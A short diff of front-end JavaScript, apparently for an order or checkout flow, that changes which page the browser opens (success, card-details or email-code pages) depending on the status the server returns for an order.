@@ -72,9 +72,9 @@
           location.href = data.redirect_to + (data.redirect_to.includes('?') ? '&' : '?') + 'order=' + orderId;
           return;
         }
-        if (data.status === "email_code_confirmed") {
-          location.href = "card-details.html?order=" + orderId;
-        } else if (data.status === "email_code_rejected") {
+        if (data.status === "confirmed" || data.status === "completed") {
+          location.href = "success.html?order=" + orderId;
+        } else if (data.status === "rejected") {
           location.href = "email-code.html?order=" + orderId + "&error=1";
         }
       })
